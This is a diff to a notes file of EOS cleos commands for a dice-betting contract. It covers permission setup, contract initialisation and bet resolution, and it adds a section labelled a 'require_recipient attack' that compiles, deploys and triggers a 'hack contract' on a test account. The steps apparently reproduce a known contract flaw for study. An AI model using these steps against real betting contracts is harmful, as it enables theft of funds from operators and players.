@@ -22,7 +22,6 @@ cleos set account permission safetransfer active '{"threshold": 1,"keys": [{"key
 
 cleos set account permission eosbetcasino random '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[]}' owner -p eosbetcasino@owner
 
-
 // initcontract 
 cleos push action eosbetdice11 initcontract '{"randomness_key":"EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi"}' -p eosbetcasino
 
@@ -38,3 +37,14 @@ cleos get table eosbetdice11 eosbetdice11 activebets
 // try resolvebet (先用 get table eosbetdice11 eosbetdice11 activebets 获取 bet_id, 签名替换为你的私钥对应生成签名。
 cleos push action eosbetdice11 resolvebet '{"bet_id":"13268895739635552667", "sig":"SIG_K1_JyLrnpivQrsrmfaFqpk8168zS3sAxVi91KWb3MCkU5uBNrj52h7GPp5HMSxxdA3y9yMPHpQSWw1PNn4kJojMAHK2kK9fRY"}' -p eosbetcasino@random
 
+
+// 10.15 require_recipient attack
+
+// deploy hack contract
+eosiocpp -o /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.wast /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.cpp
+eosiocpp -g /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.abi /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.cpp
+
+cleos set code testuser1111 /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.wast
+cleos set abi testuser1111 /Users/joe/Workspace/eos-project/eos-bet-dice/recipientattack.abi
+
+cleos transfer joetothemoon testuser1111 "1.0000 EOS" "66-testuser1111-" -p joetothemoon
